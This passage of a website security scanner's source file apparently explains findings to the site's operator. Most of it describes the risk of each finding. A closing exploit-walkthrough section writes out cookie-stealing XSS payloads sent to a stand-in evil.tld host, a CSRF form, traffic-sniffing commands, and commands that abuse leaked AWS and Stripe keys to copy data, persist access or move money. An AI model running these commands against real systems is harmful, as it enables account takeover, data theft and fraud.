    impact: 'Input reflection is still a sink — one bypass reopens XSS.',
    worstCase: 'Reflected XSS if any context is missed (inside <script> or an attribute).',
  },
  'host-header-injection': {
    whatItIs: 'The server echoes the client-supplied Host header into responses.',
    whoCanAct: 'Anyone who can send a request with a forged Host.',
    impact: 'Poisoned password-reset links, cache poisoning and SSRF against internal vhosts.',
    worstCase: 'Reset-token theft leading to full account takeover.',
  },
  'http-methods': {
    whatItIs: 'Write or debug HTTP methods (PUT/DELETE/TRACE/TRACK) are enabled.',
    whoCanAct: 'Any unauthenticated client that can reach the server.',
    impact: 'PUT/DELETE can overwrite files; TRACE reflects cookies past HttpOnly (cross-site tracing).',
    worstCase: 'Defacement or data destruction, or session theft via cross-site tracing.',
  },
  'dir-listing': {
    whatItIs: 'Directory autoindexing is enabled on one or more paths.',
    whoCanAct: 'Anyone who can browse the path.',
    impact: 'Backups, drafts, uploads and source maps become enumerable.',
    worstCase: 'Mass personal-data exposure (a breach) plus source and config disclosure.',
  },
  'crossdomain-policy': {
    whatItIs: 'Legacy Flash/Silverlight cross-domain policy files are published.',
    whoCanAct: 'Any website the victim visits — the file grants cross-origin access.',
    impact: 'A wildcard entry let any origin read authenticated responses.',
    worstCase: 'Cross-origin data theft with zero benefit, since Flash is dead.',
  },
  'graphql-introspection': {
    whatItIs: 'The GraphQL schema is fully readable via introspection.',
    whoCanAct: 'Anyone who can reach the endpoint.',
    impact: 'An attacker maps every type, field and admin mutation in one request.',
    worstCase: 'Targeted mutation abuse (account or data manipulation) once auth gaps are found.',
  },
  'api-error-verbose': {
    whatItIs: 'Error responses leak stack traces, SQL or framework signatures.',
    whoCanAct: 'Anyone who can trigger an error.',
    impact: 'Reveals framework, versions, file paths and query structure.',
    worstCase: 'Turns a generic exploit into a precise, working one.',
  },
  'bucket-public': {
    whatItIs: 'An object-storage bucket allows anonymous listing.',
    whoCanAct: 'Anyone who knows or guesses the bucket name.',
    impact: 'Every stored object (invoices, exports, database dumps) is downloadable.',
    worstCase: 'Bulk exfiltration of user data — a full, reportable breach.',
  },
  'bucket-referenced': {
    whatItIs: 'A storage bucket is referenced by the frontend but does not list anonymously.',
    whoCanAct: 'No one via listing — this is the correct configuration.',
    impact: 'Informational: confirms your storage provider and the surrounding attack surface.',
    worstCase: 'None while public-access-block stays on; rotate app credentials on a schedule.',
  },
  'ws-insecure': {
    whatItIs: 'A WebSocket is opened over ws:// (unencrypted).',
    whoCanAct: 'Anyone on the same network path (public Wi-Fi, rogue AP, ARP spoof).',
    impact: 'Message streams — including tokens and chat — are readable and injectable.',
    worstCase: 'Session and token theft plus full manipulation of the realtime channel.',
  },
  'ws-endpoints': {
    whatItIs: 'WebSocket endpoints were discovered and fingerprinted.',
    whoCanAct: 'Anyone who can open a socket to the endpoint.',
    impact: 'Realtime channels are stateful and per-message authorization is easy to miss.',
    worstCase: 'Broken object-level authorization — reading other users channels.',
  },
  'sri-missing': {
    whatItIs: 'Third-party scripts or styles load without Subresource Integrity.',
    whoCanAct: 'The CDN, or anyone who compromises it or hijacks its DNS.',
    impact: 'The browser runs whatever the CDN returns, on every load.',
    worstCase: 'Arbitrary JS in your origin — full DOM, cookie and network access (supply-chain XSS).',
  },
  'third-party-surface': {
    whatItIs: 'The page loads scripts from several distinct third-party hosts.',
    whoCanAct: 'Each host is a party you do not control.',
    impact: 'Availability, privacy (GDPR transfer) and extra DNS/TLS latency.',
    worstCase: 'A single dead or breached host breaks or compromises the whole page.',
  },
  'pii-exposure': {
    whatItIs: 'Personal or financial data (IBANs, card-shaped numbers) is embedded in the source.',
    whoCanAct: 'Anyone who views the source or downloads the JS bundle.',
    impact: 'An exfiltration-grade leak of personal data sitting in plain view.',
    worstCase: 'A GDPR Art. 33/34 breach — mandatory notification, fines and fraud.',
  },
  'pii-iban': {
    whatItIs: 'IBAN-shaped values are exposed in the page source.',
    whoCanAct: 'Anyone who reads the HTML or the JS bundle.',
    impact: 'A name plus an IBAN is enough to attempt a SEPA direct debit.',
    worstCase: 'Payment fraud and a GDPR Art. 34 breach-notification event.',
  },
  'public-company-trr': {
    whatItIs: 'A verified corporate bank account (TRR/IBAN) is displayed on the page.',
    whoCanAct: 'Customers and partners initiating bank wire / UPN payments.',
    impact: 'Customary EU business practice for invoicing and direct bank transfers.',
    worstCase: 'None — under GDPR Recital 14, legal entity data is not personal data.',
  },

  /* ---- Shodan InternetDB findings ---- */
  'shodan-exposed-db': {
    whatItIs: 'A database or cache service port (e.g. MySQL, PostgreSQL, Redis, MongoDB, Elasticsearch, Memcached, MSSQL) is directly reachable from the public internet.',
    whoCanAct: 'Anyone on the public internet — automated vulnerability scanners, botnets, and attackers.',
    impact: 'Attackers can attempt brute-force authentication, exploit unauthenticated configurations (e.g. default Redis or MongoDB), or leverage known database CVEs.',
    worstCase: 'Complete database compromise, data exfiltration, ransomware encryption, or total database wipe.',
  },
  'shodan-exposed-remote-mgmt': {
    whatItIs: 'Unencrypted or graphical remote administration services (RDP, VNC, Telnet) are exposed directly to the public internet.',
    whoCanAct: 'Any remote attacker scanning the internet for accessible administrative interfaces.',
    impact: 'Exposes administrative login prompts to credential stuffing, password brute-forcing, and known remote code execution vulnerabilities.',
    worstCase: 'Full server takeover via interactive graphical desktop or root administrative shell.',
  },
  'shodan-known-cve': {
    whatItIs: 'Public security databases (Shodan InternetDB / NIST NVD) index known, unpatched CVE vulnerabilities on services running on this host IP.',
    whoCanAct: 'Attackers using automated vulnerability scanners or public exploit databases (Exploit-DB, Metasploit).',
    impact: 'Known vulnerabilities have published proof-of-concept exploits that attackers can fire against the server without prior reconnaissance.',
    worstCase: 'Remote code execution, service denial of service, privilege escalation, or unauthorized data access.',
  },
  'shodan-ssh-open': {
    whatItIs: 'The SSH remote administration service (port 22) is open and reachable on the host public IP address.',
    whoCanAct: 'Anyone on the internet who can send TCP traffic to port 22.',
    impact: 'Exposes SSH to constant automated dictionary scans and brute-force botnets.',
    worstCase: 'If password authentication is permitted or weak keys are used, an attacker gains shell access.',
  },

  /* ---- Google CrUX field data findings ---- */
  'crux-field-fast': {
    whatItIs: 'Real-world Chrome user experience data from the Google Chrome UX Report (CrUX) confirms fast page loads and smooth interactivity.',
    whoCanAct: 'Website engineering and performance optimization team.',
    impact: 'Provides positive ranking signals for Google Search Core Web Vitals and delivers a fast, low-bounce user experience.',
    worstCase: 'Performance regressions if unoptimized third-party scripts or uncompressed media are added.',
  },
  'crux-field-slow': {
    whatItIs: 'Aggregated 28-day field data from real Google Chrome users (CrUX) categorizes this website as SLOW.',
    whoCanAct: 'Google Search algorithm (ranking demotion) and real visitors experiencing lag.',
    impact: 'Failing Core Web Vitals directly damages organic Google Search rankings and drives up user bounce rates.',
    worstCase: 'Significant loss of organic search traffic, poor conversion rates, and frustrated mobile users.',
  },

  /* ---- Certificate Transparency reconnaissance findings ---- */
  'ct-exposed-staging': {
    whatItIs: 'Public Certificate Transparency logs contain issued SSL certificates for test or development environments.',
    whoCanAct: 'Attackers inspecting public Certificate Transparency (CT) logs.',
    impact: 'Exposes unhardened code, debug endpoints, or legacy software to reconnaissance.',
    worstCase: 'Attacker accesses staging database or exploits development credentials to breach production.',
  },

  /* ---- SEO ---- */
  'seo-title': {
    whatItIs: 'The page has no <title> tag.',
    whoCanAct: 'No attacker — search engines and users lose the page identity.',
    impact: 'Search snippets are generated arbitrarily and clicks drop.',
    worstCase: 'The page ranks for the wrong query or is never clicked.',
  },
  'seo-title-len': {
    whatItIs: 'The <title> length falls outside the 15-65 character window.',
    whoCanAct: 'No attacker — this is a SERP truncation and ranking issue.',
    impact: 'Titles get cut off in results or look thin.',
    worstCase: 'Lower click-through and wasted keyword targeting.',
  },
  'seo-desc': {
    whatItIs: 'There is no meta description.',
    whoCanAct: 'No attacker — snippet quality degrades.',
    impact: 'Search engines invent a snippet from page text.',
    worstCase: 'Uncontrolled, less persuasive search snippets.',
  },
  'seo-desc-len': {
    whatItIs: 'The meta description is outside the 120-160 character window.',
    whoCanAct: 'No attacker — snippet truncation.',
    impact: 'The call to action is cut off in results.',
    worstCase: 'Weaker click-through than a well-sized description.',
  },
  'seo-canonical': {
    whatItIs: 'No canonical link is declared.',
    whoCanAct: 'No attacker — duplicate-content signals split ranking.',
    impact: 'Multiple URLs compete for the same content.',
    worstCase: 'Ranking dilution and inconsistent indexing.',
  },
  'seo-viewport': {
    whatItIs: 'There is no viewport meta tag.',
    whoCanAct: 'No attacker — mobile rendering breaks.',
    impact: 'The page does not scale on phones, so text is tiny.',
    worstCase: 'A mobile usability failure and a mobile-first ranking penalty.',
  },
  'seo-lang': {
    whatItIs: 'The <html> element has no lang attribute.',
    whoCanAct: 'No attacker — hreflang and pronunciation signals are lost.',
    impact: 'Search engines and screen readers cannot confirm the page language.',
    worstCase: 'Wrong-locale indexing and an accessibility failure.',
  },
  'seo-h1': {
    whatItIs: 'The page has no <h1>.',
    whoCanAct: 'No attacker — topical relevance is weakened.',
    impact: 'There is no primary keyword signal for the page.',
    worstCase: 'Lower relevance for the page core topic.',
  },
  'seo-h1-multi': {
    whatItIs: 'The page has several <h1> headings.',
    whoCanAct: 'No attacker — diluted topical focus.',
    impact: 'Keyword intent is split across headings.',
    worstCase: 'An unclear page topic for crawlers.',
  },
  'seo-og': {
    whatItIs: 'There are no Open Graph tags.',
    whoCanAct: 'No attacker — social sharing degrades.',
    impact: 'Links render as bare URLs on social platforms and in chat.',
    worstCase: 'Lower social click-through and unbranded previews.',
  },
  'seo-jsonld': {
    whatItIs: 'There is no schema.org JSON-LD structured data.',
    whoCanAct: 'No attacker — rich results are unavailable.',
    impact: 'No FAQ, breadcrumb or organization rich snippets.',
    worstCase: 'Fewer SERP features and lower visibility.',
  },
  'seo-status': {
    whatItIs: 'The page did not return HTTP 200.',
    whoCanAct: 'No attacker — a crawl and indexing problem.',
    impact: 'A non-200 status harms indexing and user trust.',
    worstCase: 'The page is dropped from the index.',
  },
  'seo-structured-data': {
    whatItIs: 'No JSON-LD structured data is present.',
    whoCanAct: 'No attacker — rich-result eligibility is lost.',
    impact: 'Search engines cannot build entity or rich snippets.',
    worstCase: 'Fewer SERP enhancements and lower click-through.',
  },
  'seo-structured-data-invalid': {
    whatItIs: 'One or more JSON-LD blocks do not parse.',
    whoCanAct: 'No attacker — the structured data is simply ignored.',
    impact: 'Malformed JSON is silently discarded by crawlers.',
    worstCase: 'No rich results despite the effort of adding markup.',
  },
  'seo-structured-data-incomplete': {
    whatItIs: 'Structured-data types are missing required properties.',
    whoCanAct: 'No attacker — the markup is ineligible.',
    impact: 'Search engines reject incomplete entities.',
    worstCase: 'Rich results never appear.',
  },
  'seo-structured-data-base': {
    whatItIs: 'No Organization or WebSite entity is declared.',
    whoCanAct: 'No attacker — brand-entity signals are weak.',
    impact: 'Knowledge-panel and sitelinks eligibility is reduced.',
    worstCase: 'A weaker brand presence in search.',
  },
  'seo-llms-txt': {
    whatItIs: 'No /llms.txt file is published.',
    whoCanAct: 'No attacker — AI crawlers lack guidance.',
    impact: 'AI assistants cannot find your preferred machine-readable summary.',
    worstCase: 'Your content is quoted without the framing you want.',
  },
  'seo-llms-txt-h1': {
    whatItIs: 'The /llms.txt file is missing an H1 title.',
    whoCanAct: 'No attacker — AI crawlers and PageSpeed Insights lack the primary project entity.',
    impact: 'Google PageSpeed Insights and AI crawlers cannot identify the canonical project name.',
    worstCase: 'AI agents fail to associate llms.txt content with your brand.',
  },
  'seo-llms-txt-links': {
    whatItIs: 'The /llms.txt file does not use standard Markdown link format [Title](url).',
    whoCanAct: 'No attacker — AI crawlers and PageSpeed Insights cannot parse links.',
    impact: 'Google PageSpeed Insights Agentic Browsing fails and LLM crawlers cannot index linked pages.',
    worstCase: 'AI models fail to traverse your site pages and reference obsolete data.',
  },
  'seo-ai-crawler-policy': {
    whatItIs: 'robots.txt does not state a policy for AI crawlers.',
    whoCanAct: 'AI crawlers such as GPTBot, ClaudeBot and Google-Extended.',
    impact: 'Content is scraped with no opt-in or opt-out signal.',
    worstCase: 'Your content trains models or appears in AI answers without attribution.',
  },
  'seo-ai-content-scraped': {
    whatItIs: 'Content is open to a number of known AI crawlers.',
    whoCanAct: 'Every listed AI crawler.',
    impact: 'Content may be ingested for training or AI answers.',
    worstCase: 'Competitive content reuse with no click-through back to you.',
  },
  'seo-noindex': {
    whatItIs: 'The page is marked noindex.',
    whoCanAct: 'No attacker — it is hidden from search, deliberately or by mistake.',
    impact: 'The page will not rank.',
    worstCase: 'Accidental site-wide deindexing.',
  },
  'seo-noindex-header': {
    whatItIs: 'An X-Robots-Tag header sets noindex.',
    whoCanAct: 'No attacker — a header-level indexing block.',
    impact: 'Search engines drop the URL.',
    worstCase: 'Whole sections removed from the index by a stray header.',
  },
  'seo-canonical-cross-domain': {
    whatItIs: 'The canonical points at a different domain.',
    whoCanAct: 'No attacker — you are de-ranking yourself.',
    impact: 'Ranking signals are passed to the other domain.',
    worstCase: 'Your pages compete with, and lose to, the canonical target.',
  },
  'seo-canonical-www-mismatch': {
    whatItIs: 'The canonical URL points between apex and www on the same domain.',
    whoCanAct: 'No attacker — search indexing preference.',
    impact: 'Search engines consolidate authority to the declared canonical version.',
    worstCase: 'If redirects conflict with canonical, crawlers experience an extra redirect hop.',
  },
  'seo-hreflang-missing': {
    whatItIs: 'There are no hreflang annotations for a multi-language site.',
    whoCanAct: 'No attacker — the wrong locale may be served.',
    impact: 'Users get the wrong language in search results.',
    worstCase: 'Locale cannibalisation and lost regional traffic.',
  },
  'seo-hreflang-invalid': {
    whatItIs: 'hreflang values are malformed.',
    whoCanAct: 'No attacker — the annotations are ignored.',
    impact: 'Search engines cannot map language and region pairs.',
    worstCase: 'All hreflang signals are discarded.',
  },
  'seo-hreflang-xdefault': {
    whatItIs: 'The hreflang set has no x-default entry.',
    whoCanAct: 'No attacker — no fallback locale is declared.',
    impact: 'Unmatched users get an arbitrary locale.',
    worstCase: 'Wrong-language pages served to users worldwide.',
  },
  'seo-social-image': {
    whatItIs: 'There is no dedicated social-share (Open Graph) image.',
    whoCanAct: 'No attacker — previews are unbranded.',
    impact: 'Links share as plain text.',
    worstCase: 'Lower engagement on every share.',
  },
  'seo-twitter-card': {
    whatItIs: 'There is no Twitter/X card metadata.',
    whoCanAct: 'No attacker — previews are degraded.',
    impact: 'Posts show a bare link.',
    worstCase: 'Lower share click-through.',
  },
  'seo-robots': {
    whatItIs: 'robots.txt is missing or unreadable.',
    whoCanAct: 'No attacker — crawler guidance is gone.',
    impact: 'Crawlers choose for themselves which paths to index.',
    worstCase: 'Sensitive or staging paths get indexed.',
  },
  'seo-robots-block': {
    whatItIs: 'robots.txt blocks paths you likely want indexed.',
    whoCanAct: 'No attacker — a self-inflicted visibility block.',
    impact: 'Those URLs will not rank.',
    worstCase: 'Lost organic traffic for key pages.',
  },
  'seo-sitemap': {
    whatItIs: 'No XML sitemap was found.',
    whoCanAct: 'No attacker — discovery is slower and incomplete.',
    impact: 'New pages are indexed late or not at all.',
    worstCase: 'Missed indexing for important content.',
  },

  /* ---- performance & asset hygiene ---- */
  'perf-longtasks': {
    whatItIs: 'Long main-thread tasks were measured during load.',
    whoCanAct: 'No attacker — input responsiveness suffers.',
    impact: 'Taps and clicks feel delayed; INP degrades.',
    worstCase: 'Measurable conversion loss on mobile.',
  },
  'perf-transfer': {
    whatItIs: 'The page transfers more bytes than it should.',
    whoCanAct: 'No attacker — every user pays the cost.',
    impact: 'Slower load on mobile networks and higher data usage.',
    worstCase: 'Poor Core Web Vitals and lower ranking.',
  },
  'perf-failed-requests': {
    whatItIs: 'Requests failed during page load.',
    whoCanAct: 'No attacker — broken assets or fetches.',
    impact: 'Missing images and scripts, plus wasted round-trips.',
    worstCase: 'Silent breakage of features in production.',
  },
  'perf-network-errors': {
    whatItIs: 'Network-level errors occurred while loading.',
    whoCanAct: 'No attacker, but intermittent infrastructure trouble.',
    impact: 'Resource failures degrade the page.',
    worstCase: 'Flaky UX and hidden outages.',
  },
  'page-weight': {
    whatItIs: 'The page is heavy in transferred bytes.',
    whoCanAct: 'No attacker — a pure performance cost.',
    impact: 'Slow load on mobile; higher bounce rate.',
    worstCase: 'Failing Core Web Vitals and a ranking penalty.',
  },
  'render-blocking': {
    whatItIs: 'Blocking CSS or JS delays first paint and interactivity.',
    whoCanAct: 'No attacker — a pure performance cost.',
    impact: 'Higher LCP and INP.',
    worstCase: 'Measurable revenue loss from a slow first interaction.',
  },
  'inline-scripts': {
    whatItIs: 'The page contains inline <script> blocks.',
    whoCanAct: 'An XSS injection gains a nonce-free execution context.',
    impact: 'Inline scripts block a strict CSP (no nonce or hash) and add parse cost.',
    worstCase: 'CSP cannot be hardened, leaving XSS easier to exploit.',
  },
  'no-compression': {
    whatItIs: 'Responses are not gzip or brotli compressed.',
    whoCanAct: 'No attacker — bandwidth waste.',
    impact: 'HTML, JS and CSS ship larger than necessary.',
    worstCase: 'Slower load and higher CDN egress cost.',
  },
  'no-cache': {
    whatItIs: 'No caching headers are set.',
    whoCanAct: 'No attacker — repeat loads are slow.',
    impact: 'Browsers and CDNs cannot cache, so every visit re-downloads.',
    worstCase: 'Poor repeat-visit performance and wasted origin load.',
  },
  'img-format': {
    whatItIs: 'Images are served as legacy PNG/JPEG/GIF.',
    whoCanAct: 'No attacker — heavier payloads.',
    impact: 'Images are 30-60% larger than WebP or AVIF equivalents.',
    worstCase: 'Slower LCP on image-heavy pages.',
  },
  'http-redirect': {
    whatItIs: 'Multiple redirects occur before the final page.',
    whoCanAct: 'No attacker — extra round-trips.',
    impact: 'Each hop adds latency before render.',
    worstCase: 'Slower load and diluted link equity.',
  },
  'deprecated': {
    whatItIs: 'Deprecated web-platform features are in use.',
    whoCanAct: 'No attacker directly — dead or fragile tech.',
    impact: 'Features may break as browsers remove support.',
    worstCase: 'Sudden breakage with no replacement in place.',
  },
  'dns-dnssec': {
    whatItIs: 'DNSSEC is not enabled for the domain.',
    whoCanAct: 'A network or DNS attacker able to spoof responses.',
    impact: 'DNS answers are not cryptographically verified.',
    worstCase: 'Cache poisoning or DNS spoofing redirects users to an attacker host.',
  },
  'no-security-txt': {
    whatItIs: 'No /.well-known/security.txt is published.',
    whoCanAct: 'No attacker — a coordination gap.',
    impact: 'Researchers cannot find your disclosure contact.',
    worstCase: 'Vulnerabilities are sold or publicised instead of reported privately.',
  },
  'trackers': {
    whatItIs: 'Third-party trackers were detected on the page.',
    whoCanAct: 'The tracker vendors and any regulator.',
    impact: 'User behaviour is collected; a consent and lawful basis must exist.',
    worstCase: 'A GDPR/ePrivacy breach if loaded without consent.',
  },
  'no-consent': {
    whatItIs: 'Trackers load with no consent banner detected.',
    whoCanAct: 'A regulator and any privacy-aware user.',
    impact: 'Non-essential cookies and identifiers are set pre-consent.',
    worstCase: 'An ePrivacy Art. 5(3) + GDPR breach — fines and forced remediation.',
  },
  'consent-present': {
    whatItIs: 'A consent mechanism was detected alongside trackers.',
    whoCanAct: 'No direct attacker — this is informational.',
    impact: 'Confirms a CMP is present; verify it truly blocks pre-consent.',
    worstCase: 'A cosmetic banner that grants by default still breaches the rules.',
  },
  'data-residency': {
    whatItIs: 'Third-party infrastructure suggests data may leave your control.',
    whoCanAct: 'The third-party sub-processor and a regulator.',
    impact: 'A potential non-EU transfer without documented safeguards.',
    worstCase: 'A GDPR Chapter V breach and a reportable transfer incident.',
  },
  'hdr-': {
    whatItIs: 'A recommended security response header is missing.',
    whoCanAct: 'Browser-side attackers who exploit the missing control.',
    impact: 'The specific protection (framing, MIME-sniffing, referrer, permissions) is absent.',
    worstCase: 'Chained with other findings into clickjacking, XSS or data leakage.',
  },
  'hdr-x-content-type-options': {
    whatItIs: 'The X-Content-Type-Options: nosniff header is missing.',
    whoCanAct: 'Any attacker who can get a file served with the wrong MIME type.',
    impact: 'Browsers may sniff and execute an uploaded file as HTML/script.',
    worstCase: 'Stored XSS from an uploaded image or text file the browser reinterprets.',
  },
  'hdr-x-frame-options': {
    whatItIs: 'Neither X-Frame-Options nor CSP frame-ancestors blocks framing.',
    whoCanAct: 'Any site that embeds your pages in an iframe.',
    impact: 'Clickjacking: invisible overlays trick users into clicking real controls.',
    worstCase: 'Silent account actions, purchases or data changes by a deceived user.',
  },
  'hdr-referrer-policy': {
    whatItIs: 'No Referrer-Policy is set.',
    whoCanAct: 'Third-party sites and analytics that receive your referral data.',
    impact: 'Full URLs — including tokens in query strings — leak to external sites.',
    worstCase: 'Session or reset tokens exposed through the Referer header.',
  },
  'hdr-permissions-policy': {
    whatItIs: 'No Permissions-Policy is set.',
    whoCanAct: 'Embedded third-party scripts and iframes.',
    impact: 'Powerful APIs (camera, mic, geolocation) are not restricted.',
    worstCase: 'A compromised third party silently prompts for or uses device permissions.',
  },
  'hdr-permissions-policy-overgrant': {
    whatItIs: 'A Permissions-Policy is set but grants one or more powerful features to every origin (`feature=*`).',
    whoCanAct: 'Any third-party page or iframe you embed, or anyone who embeds you.',
    impact: 'The policy advertises that camera, mic, geolocation, USB, etc. are available without restriction — the header protects nothing.',
    worstCase: 'A malicious embedder triggers device permissions or reads sensitive APIs under your origin’s trust.',
  },
  'policy-': {
    whatItIs: 'A required policy page (privacy, cookie, terms or imprint) was not found.',
    whoCanAct: 'A regulator; no attacker needed.',
    impact: 'Users cannot see how their data is handled.',
    worstCase: 'A GDPR Art. 12-14 transparency breach and DPA complaints.',
  },
  'policy-privacy-policy': {
    whatItIs: 'No privacy-policy link was found.',
    whoCanAct: 'A data-protection authority; no attacker needed.',
    impact: 'Users cannot learn what personal data you process or why.',
    worstCase: 'A GDPR Art. 12-14 transparency breach and DPA complaints.',
  },
  'policy-cookie-policy': {
    whatItIs: 'No cookie-policy link was found.',
    whoCanAct: 'A regulator; no attacker needed.',
    impact: 'Users cannot see which cookies are set and their purpose.',
    worstCase: 'An ePrivacy / GDPR transparency breach.',
  },
  'policy-terms': {
    whatItIs: 'No terms-of-service link was found.',
    whoCanAct: 'A consumer-protection authority; no attacker needed.',
    impact: 'No contractual ground rules or liability terms are published.',
    worstCase: 'Consumer-law exposure and disputes with no agreed terms.',
  },
  'policy-imprint-company-info': {
    whatItIs: 'No imprint / company-information page was found.',
    whoCanAct: 'A regulator; no attacker needed.',
    impact: 'Users cannot identify or contact the operator.',
    worstCase: 'A legal-notice (imprint) compliance failure in the EU.',
  },
  'csp-unsafe-inline': {
    whatItIs: 'The Content-Security-Policy allows inline scripts and styles (unsafe-inline).',
    whoCanAct: 'Anyone who can get text into the page: profile fields, comments, a CMS widget, a compromised third-party script.',
    impact: 'An injected inline script runs with full access to the page and its cookies.',
    worstCase: 'XSS that steals the session, keys and payment-form data of every visitor.',
  },
  'csp-unsafe-eval': {
    whatItIs: 'The Content-Security-Policy allows eval() (unsafe-eval).',
    whoCanAct: 'An attacker who can influence data that reaches a string-evaluating path (JSON.parse polyfill, template engine, library sink).',
    impact: 'Strings can be executed as code, so a data-only bug turns into code execution.',
    worstCase: 'Remote code execution in the browser context, with the visitor\'s session.',
  },
  'cors-credential-leak': {
    whatItIs: 'CORS reflects an arbitrary Origin while allowing credentials (cookies).',
    whoCanAct: 'Any site on the internet the victim visits, with no prior access to yours.',
    impact: 'The attacker\'s page reads authenticated responses from your API as the victim.',
    worstCase: 'Account takeover: profile, email, invoices and any other authenticated data are exfiltrated.',
  },
  'sourcemap-exposed': {
    whatItIs: 'Production JavaScript source maps (.map) are publicly downloadable.',
    whoCanAct: 'Anyone — the files are public.',
    impact: 'Original source, comments, internal URLs and sometimes hard-coded keys and API endpoints are recoverable.',
    worstCase: 'The attacker reads internal logic and credentials, then targets endpoints that were never meant to be public.',
  },
  'debug-endpoints-exposed': {
    whatItIs: 'A debug or development endpoint (/debug, /actuator, /graphql playground, ...) answers on the public site.',
    whoCanAct: 'Anyone who can reach the site.',
    impact: 'Internal configuration, environment data or privileged operations are exposed without auth.',
    worstCase: 'Environment secrets or admin operations are readable and callable by anyone on the internet.',
  },
};

/* ------------------------------------------------------------------ *
 * Exploit walkthrough layer.
 * For every finding type, the exact sequence an attacker runs to turn
 * the weakness into impact. No redaction — VibeScan is a local,
 * single-operator tool, so evidence and commands are shown in full.
 * ------------------------------------------------------------------ */

const EXPLOIT = {
  'waf-challenge-intercepted': [
    'N/A to an attacker — this means the site’s WAF or bot protection actively challenged our crawler.',
    'An unauthenticated automated client requests the page without solving the JavaScript challenge.',
    'The edge returns an interstitial challenge page (often HTTP 403/429 or bot challenge markup).',
    'Public crawlers are blocked from reading body markup unless exempted or running a trusted browser session.',
  ],
  'waf-headers-unverified': [
    'N/A to an attacker — the WAF blocked direct HTTP inspection and HTML-only fallback does not return origin headers.',
    'A bot challenge intercepts the direct TLS/HTTP GET and returns edge challenge headers without origin HSTS/CSP.',
    'VibeScan retrieves rendered DOM via Firecrawl without inheriting the 403 challenge headers.',
    'Verify the origin HTTP headers directly with `curl -I` from an allowed IP or browser DevTools Network tab.',
  ],
  'eu-cookie-excessive-duration': [
    'N/A to a classic exploit — this is a GDPR / ePrivacy data-minimisation compliance issue.',
    'Inspect `Set-Cookie` headers in browser DevTools or `curl -I` for `Max-Age > 34164000` (13 months).',
    'Long-lived analytics/tracking cookies retain user identifiers across years without renewed consent.',
    'DPA audits can cite the raw `Set-Cookie` header directly as objective evidence of over-retention.',
  ],
  'seo-private-noindex': [
    'N/A to an attacker — this is an informational check confirming an intentional noindex + Disallow configuration.',
    'Check `/robots.txt` (`Disallow: /`) and `<meta name="robots" content="noindex">` or `X-Robots-Tag`.',
    'Search crawlers skip indexing, and VibeScan suppresses public SEO ranking heuristics accordingly.',
    'No fix needed for private portals; only remove if this page was meant to rank publicly.',
  ],
  'tls-untrusted': [
    'Get on the same network path as a victim (public Wi-Fi, rogue AP, ARP spoof, BGP/ISP).',
    'Serve a self-signed cert for the site\'s hostname — the browser has no trusted anchor to reject it.',
    'Proxy all traffic: `mitmproxy -p 8080` with a forged cert; victim hits the site and sees the padlock warning, most click through.',
    'Harvest credentials + session cookies, then replay them against the real site.',
  ],
  'tls-expiring': [
    'Wait for/force the expiry window.',
    'Users get full-page interstitial warnings and start abandoning checkout.',
    'Browsers hard-fail after expiry — the site is effectively offline without an attacker doing anything.',
  ],
  'tls-old-protocol': [
    'Force a downgrade to the legacy protocol: `openssl s_client -connect host:443 -tls1` or `-tls1_1`.',
    'Collect captured traffic, then run a known attack for that protocol (e.g. BEAST/POODLE on TLS1.0/CBC) to recover cookie/plaintext bytes.',
    'Replay the recovered session cookie.',
  ],
  'no-https': [
    'Position on-path (same Wi-Fi / LAN / upstream ISP).',
    'Sniff plaintext HTTP: `tcpdump -A -i eth0 host target` — credentials, cookies, and form data are fully readable.',
    'Optionally inject/modify responses (e.g. swap a script) — nothing can detect tampering without a signature.',
  ],
  'hdr-strict-transport-security': [
    'Get on-path once while the user is on a plain-HTTP link (or a hostile network).',
    'Downgrade the very first request to http:// (SSL-strip) since there is no HSTS to force HTTPS.',
    'Serve a mirrored page over HTTP and capture the login as it is typed.',
  ],
  'hdr-content-security-policy': [
    'Find any input that reflects into the HTML or any third-party script the page loads.',
    'Inject `<script src="https://evil.tld/x.js"></script>` (only blocked if CSP exists).',
    'Script runs with the site origin → read `document.cookie`, call authenticated APIs, exfil via `new Image().src="https://evil.tld/?c="+document.cookie`.',
  ],
  'csp-weak': [
    'The policy contains `unsafe-inline`/`unsafe-eval` or a wildcard — look for the gap.',
    'With unsafe-inline: inject `<img src=x onerror=fetch("https://evil.tld/"+document.cookie)>` into any reflected field.',
    'With a wildcard script-src: host the payload on any allowed CDN and reference it.',
  ],
  'cookie-insecure': [
    'Same-Wi-Fi/LAN attacker runs `tcpdump -A port 80` or a MITM proxy.',
    'Trigger any plain-HTTP request to the site (mixed content, an http:// link, a downgrade).',
    'The browser attaches the cookie in cleartext (`Cookie: sid=...`) — copy it and `curl -H "Cookie: sid=..." https://target/account`.',
  ],
  'cookie-httponly': [
    'Find one XSS (reflected, stored, or via a compromised dependency).',
    'Payload: `<img src=x onerror="fetch(\'https://evil.tld/?c=\'+encodeURIComponent(document.cookie))">`.',
    'No HttpOnly means JS reads the session cookie → instant account takeover, no password needed.',
  ],
  'cookie-samesite': [
    'Set up a third-party page the victim visits while logged in.',
    'Auto-submit a form to the target: `<form action="https://target/email/change" method=post><input name=email value=attacker@evil.tld></form><script>document.forms[0].submit()</script>`.',
    'Cookie is sent cross-site → the action executes as the victim (CSRF).',
  ],
  'mixed-content': [
    'On-path attacker intercepts the specific http:// asset request.',
    'Replace a JS file/iframe with a malicious one (`<script>` swap).',
    'The injected code runs with the site origin and can read cookies/DOM and call the API.',
  ],
  'secret-leak': [
    'Anyone can `curl` the page/JS and read the key — no access needed.',
    'AWS key: `aws configure` with the leaked pair, then `aws sts get-caller-identity` → `aws s3 ls` → `aws s3 sync s3://bucket ./loot` (or `aws iam create-user` for persistence).',
    'Google API key: `curl "https://maps.googleapis.com/maps/api/geocode/json?address=x&key=LEAKED"` — billed to you until quota/limits bite.',
    'Stripe `sk_live_`: `curl https://api.stripe.com/v1/charges -u sk_live_...:` → `GET /v1/customers` to read customer list; `POST /v1/refunds` to move money.',
    'SendGrid/Slack/Firebase tokens: send mail as you, read Slack history, or read/write the Firebase DB with the key.',
  ],
  'js-secret': [
    'Download the JS bundle: `curl https://target/static/app.js | grep -oE "(AKIA|AIza|sk_live_|xox[baprs])[A-Za-z0-9_-]+"`.',
    'Take the key to the provider API as in `secret-leak` above.',
    'Check the key\'s own permissions with the provider\'s "whoami"/list endpoints and escalate to data access.',
  ],
  'infra-paths': [
    'Guess the referenced paths directly: `curl https://target/.env`, `/.git/config`, `/backup.zip`, `/.aws/credentials`.',
    'If `.env` is served: parse DB creds, `psql/mysql -h host -u user -p` and dump tables.',
